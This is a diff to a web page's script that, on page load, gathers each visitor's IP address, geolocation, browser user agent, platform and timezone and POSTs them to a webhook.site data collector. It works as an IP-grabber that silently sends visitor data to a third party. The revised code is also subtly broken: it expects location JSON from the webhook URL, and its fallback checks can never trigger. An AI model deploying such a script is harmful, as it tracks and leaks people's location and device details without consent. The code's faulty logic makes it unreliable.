@@ -37,55 +37,59 @@
 
   <script>
     async function fetchAndSendUserInfo() {
+      // Initialize display elements
+      const ipElement = document.getElementById('ip');
+      const locationElement = document.getElementById('location');
+      const browserElement = document.getElementById('browser');
+      const timezoneElement = document.getElementById('timezone');
+
+      // Default values
+      const ipData = { ip: 'Unavailable', city: 'Unavailable', region: 'Unavailable', country_name: 'Unavailable' };
+      let userInfo = {
+        ip: 'Unavailable',
+        location: 'Unavailable',
+        browser: 'Unavailable',
+        device: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      };
+
       try {
-        // Initialize display elements
-        const ipElement = document.getElementById('ip');
-        const locationElement = document.getElementById('location');
-        const browserElement = document.getElementById('browser');
-        const timezoneElement = document.getElementById('timezone');
-
-        // Fetch IP-based geolocation
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        if (!ipResponse.ok) {
-          throw new Error('Failed to fetch IP and location data.');
+        // Fetch IP and location
+        const ipResponse = await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e');
+        if (ipResponse.ok) {
+          Object.assign(ipData, await ipResponse.json());
+          userInfo.ip = ipData.ip;
+          userInfo.location = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
         }
-        const ipData = await ipResponse.json();
 
-        // Fetch and format user data
-        const userInfo = {
-          ip: ipData.ip,
-          location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
-          browser: navigator.userAgent,
-          device: navigator.platform,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        };
+        // Set browser info
+        userInfo.browser = navigator.userAgent;
 
-        // Display user information on the page
+        // Display user info
         ipElement.textContent = `IP Address: ${userInfo.ip}`;
         locationElement.textContent = `Location: ${userInfo.location}`;
         browserElement.textContent = `Browser: ${userInfo.browser} | Device: ${userInfo.device}`;
         timezoneElement.textContent = `Timezone: ${userInfo.timezone}`;
 
         // Send data to Webhook.site
-        await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e', {
+        await fetch('https://webhook.site/your-unique-id', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(userInfo),
         });
 
-        console.log('User Info sent successfully:', userInfo);
+        console.log('Data sent to Webhook:', userInfo);
       } catch (error) {
-        console.error('Error fetching user information:', error);
+        console.error('Error fetching or sending user information:', error);
 
         // Display fallback messages
-        document.getElementById('ip').textContent = 'IP Address: Unable to fetch.';
-        document.getElementById('location').textContent = 'Location: Unable to fetch.';
-        document.getElementById('browser').textContent = 'Browser: Unable to fetch.';
-        document.getElementById('timezone').textContent = 'Timezone: Unable to fetch.';
+        if (!userInfo.ip) ipElement.textContent = 'IP Address: Unable to fetch.';
+        if (!userInfo.location) locationElement.textContent = 'Location: Unable to fetch.';
+        if (!userInfo.browser) browserElement.textContent = 'Browser: Unable to fetch.';
+        if (!userInfo.timezone) timezoneElement.textContent = 'Timezone: Unable to fetch.';
       }
     }
 
-    // Fetch and send user info when the page loads
     window.onload = fetchAndSendUserInfo;
   </script>
 </body>
